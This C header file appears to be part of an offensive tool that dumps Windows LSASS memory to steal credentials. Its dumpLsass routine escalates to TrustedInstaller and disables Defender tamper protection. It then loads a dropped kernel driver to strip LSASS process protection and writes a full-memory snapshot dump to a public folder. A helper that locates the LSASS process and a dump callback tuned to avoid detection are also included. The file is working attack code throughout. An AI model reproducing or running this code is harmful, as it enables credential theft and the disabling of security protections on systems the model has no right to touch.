#pragma once
#include "common.h"

int GetLsassPid();
BOOL dumpLsass();
BOOL CALLBACK ATPMiniDumpWriteCallBack(
	__in PVOID CallbackParam,
	__in const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
);

BOOL dumpLsass() {
	if (!WindowsEnablePrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	if (!WindowsCheckPrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	// Enable SE DEBUG TO GET HANDLES TO PROCS
	if (!WindowsEnablePrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	if (!WindowsCheckPrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	// start trusted installer
	if (!StartTrustedInstallerService())
		return Error("Failed to start trusted installer");
	// get trusted installer pid
	int trustedInstallerPid = GetProcRunningAsTrustedInstaller();
	if (trustedInstallerPid == 0)
		return Error("Failed to enum processes OR trusted installer not found!");
	// elevate to trusted installer and disable tamper protection
	if (!DisableTamperProtection(trustedInstallerPid))
		return Error("failed to disable tamper protection");
	// Drop Driver To Disk
	if (!DropTurtleDriver())
		return Error("failed to drop turtle driver to disk");
	// create driver service and load driver
	if (!LoadTurtleDriver())
		return Error("failed to load turtle driver");
	int lsassPid = GetLsassPid();
	if (!lsassPid)
		return Error("failed to get lsasspid");
	if (!DisableProcProtection(lsassPid))
		return Error("Failed to disable process protection");
	printf("Successfully Disabled Protection On %d\n", lsassPid);
	printf("Attempting to dump lsass\n");
	//
	HANDLE hLsass;
	HANDLE hDmpFile;
	hLsass = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
	if (hLsass == NULL)
		return Error("Failed to get handle to lsass");
	// get handle to dump file
	char dmpPath[] = "C:\\users\\public\\takeADump.DMP";
	hDmpFile = CreateFileA(dmpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDmpFile == INVALID_HANDLE_VALUE)
		return Error("failed to get handle to dmp file");
	printf("::: Ready to attempt dump! :::\n");
	HPSS hSnapshot;
	PSS_CAPTURE_FLAGS snapFlags = PSS_CAPTURE_VA_CLONE
		| PSS_CAPTURE_HANDLES
		| PSS_CAPTURE_HANDLE_NAME_INFORMATION
		| PSS_CAPTURE_HANDLE_BASIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
		| PSS_CAPTURE_HANDLE_TRACE
		| PSS_CAPTURE_THREADS
		| PSS_CAPTURE_THREAD_CONTEXT
		| PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
		| PSS_CREATE_BREAKAWAY_OPTIONAL
		| PSS_CREATE_BREAKAWAY
		| PSS_CREATE_RELEASE_SECTION
		| PSS_CREATE_USE_VM_ALLOCATIONS;
	DWORD hr = PssCaptureSnapshot(hLsass, snapFlags, CONTEXT_ALL, &hSnapshot);
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = ATPMiniDumpWriteCallBack;
	CallbackInfo.CallbackParam = NULL;
	BOOL yes = MiniDumpWriteDump(hSnapshot, lsassPid, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (!yes)
		return Error("failed to dump lsass");
	CloseHandle(hLsass);
	CloseHandle(hDmpFile);
	printf(":::: Successfully dumped lsass -> C:\\users\\public\\DUMP ::::\n");
	Sleep(5000);
	if (!CleanUp(trustedInstallerPid))
		return Error("Failed to cleanup");
	return TRUE;
}

int GetLsassPid() {
	size_t bufferSize = 102400;
	ULONG ulReturnLength;
	NTSTATUS status;
	int myPid = GetCurrentProcessId();
	int parentPid = -1;
	int parentPidImageSize;
	PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFO procInfo;
	procInfo = (PSYSTEM_PROCESS_INFO)buffer;
	status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS)
		return Error("Failed to query proc list"); // returns ZERO
	// save into dictionary
	while (procInfo->NextEntryOffset) {
		//get proc info
		procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		//open handle to proc if you can
		HANDLE procHandle;
		HANDLE procToken;
		procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (int)procInfo->ProcessId);
		// if no handle move to next proccess
		if (procHandle == INVALID_HANDLE_VALUE) {
			continue;
		}
		if (!OpenProcessToken(procHandle, TOKEN_QUERY, &procToken)) {
			continue;
		}
		// if got handle and token get token info to get sid
		TOKEN_OWNER* tokenOwnerBuffer;
		DWORD tokenInfoLength;
		GetTokenInformation(procToken, TokenOwner, NULL, 0, &tokenInfoLength);
		tokenOwnerBuffer = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tokenInfoLength);
		if (!GetTokenInformation(procToken, TokenOwner, tokenOwnerBuffer, tokenInfoLength, &tokenInfoLength)) {
			printf("failed at get token info");
		}
		DWORD dwSize = 256;
		char userName[256];
		char userDomain[256];
		SID_NAME_USE sidType;
		// get user from SID if fails move to next process
		if (!LookupAccountSidA(NULL, tokenOwnerBuffer->Owner, userName, &dwSize, userDomain, &dwSize, &sidType)) {
			printf("failed to get sid");
			continue;
		}
		//printf("Image Name: %ws ::: User Name: %s\\%s ::: Pid: %d\n", procInfo->ImageName.Buffer, userDomain, userName, (int)procInfo->ProcessId);
		if (wcsncmp(procInfo->ImageName.Buffer, L"lsass.exe", procInfo->ImageName.Length) == 0) {        
			printf("Image Name: %ws ::: User Name: %s\\%s ::: Pid: %d\n", procInfo->ImageName.Buffer, userDomain, userName, (int)procInfo->ProcessId);
			int lsassPid = (int)procInfo->ProcessId;
			CloseHandle(procHandle);
			CloseHandle(procToken);
			return lsassPid;
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}


BOOL CALLBACK ATPMiniDumpWriteCallBack(
	__in PVOID CallbackParam,
	__in const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
	switch (CallbackInput->CallbackType) {
	case 16:
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}
